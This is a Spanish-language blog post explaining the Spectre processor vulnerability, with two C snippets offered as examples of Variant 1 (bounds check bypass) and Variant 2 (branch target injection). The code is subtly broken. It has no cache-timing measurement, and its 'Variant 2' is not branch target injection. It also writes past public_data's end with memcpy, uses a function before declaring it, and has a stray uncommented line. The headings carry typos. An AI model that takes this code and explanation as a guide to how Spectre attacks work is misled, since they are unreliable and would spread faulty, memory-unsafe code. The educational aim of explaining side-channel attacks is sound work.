+++
title = 'Spectre Vulnerability'
date = 2024-07-21T16:28:42+02:00
hideToc = true
categories = ["post"]
draft = false
+++

Spectre es una de las vulnerabilidades de seguridad más importantes de los últimos años, afectando a prácticamente todos los procesadores modernos. Spectre explota una de las características de los procesadores modernos conocida como **ejecución especulativa**.

La ejecución esculativa se basa en intentar predecir las próximas instrucciones que se ejecutarán y las ejecutan antes de que se confirmen. Si la predicción es correcta se gana tiempo, sino, los resultados especulativos se descartan y se toma el camino correcto.
Spectre engaña al procesador para que ejecute instrucciones especulativas que no deberían haberse ejecutado y luego utiliza canales laterales para leer datos especulativamente ejecutados que deberían haber permanecido inaccesibles.

**Tipos de ataque Spectre**

**1. Spectre Variant 1: Bonuds Chechik Bypass**
Este ataque manipula las instrucciones de salto condicional (como if en C) para hacer que la CPU ejecute especulativamente instrucciones que acceden a memoria fuera de los límites permitidos. 
Escribimos un ejemplo de un posible ataque así en C:



    ´´´
    #include <stdio.h>
    #include <stdlib.h>

    // Datos secretos que el atacante quiere leer
    char secret[64] = "Este es un mensaje que el atacante quiere leer";

    // Array utilizado para la especulación
    char public_data[256];
    char side_channel[256 * 512];

    void victim_function(size_t index) {
    if (index < 256) {
        char value = public_data[index];
        side_channel[value * 512] = 1;  /* Esta línea es crítica porque 
        crea un acceso a side_channel
        basado en el valor leído de public_data. 
         Si value proviene de secret (debido a la ejecución 
         especulativa incorrecta),
        side_channel actúa como un canal lateral para filtrar ese valor.*/
    }
    }

    //atoi convierte la cadena de caracteres apuntada por argv 
    en un valor entero de tipo int.

    int main(int argc, char **argv) {
        size_t index = atoi(argv[1]);
        victim_function(index);
        return 0;
    }

    ´´´

**2. Spectre Variant 2: Branch Target Inyection**
Este ataque manipula el predictor de ramas de la CPU. El atacante entrena al predictor de ramas para que especule en una dirección particular que permite la ejecución de código malicioso, pudiendo leer datos confidenciales de otras ubicaciones de la memoria.
Un ejemplo de este ataque en C:


    ´´´

    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    // Datos secretos que el atacante quiere leer
    char secret[64] = "Datos sensibles que el atacante quiere leer";
    char public_data[256];
    char side_channel[256 * 512];

    // Función para "entrenar" la CPU para predecir incorrectamente
    void train_cpu(size_t malicious_index) {
        for (size_t i = 0; i < 10; i++) {
            victim_function(i, i);  // Entrena la CPU con índices seguros
        }
    // Ejecuta la función con el índice malicioso
    victim_function(0, malicious_index);
    }

    void victim_function(size_t index1, size_t index2) {
        if (index1 < 256) {
            if (index2 < 256) {
                char value = public_data[index2];
                side_channel[value * 512] = 1;  // Acceso a canal lateral
            }
        }
    }

    int main() {
        // Inicializar datos
        memset(public_data, 0, sizeof(public_data));
        memset(side_channel, 0, sizeof(side_channel));
    
    // Copiar datos secretos a public_data para simular un acceso especulativo
    memcpy(public_data + 256, secret, sizeof(secret));
    
    // Entrenar la CPU con un índice malicioso
    train_cpu(256 + 5);  // Acceso fuera de límites a secret[5]
    
    // Medir el acceso al canal lateral para detectar el valor filtrado
    for (int i = 0; i < 256; i++) {
        if (side_channel[i * 512] != 0) {
            printf("Secret data leaked: %c\n", (char)i);
        }
    }
    return 0;
    }

    ´´´


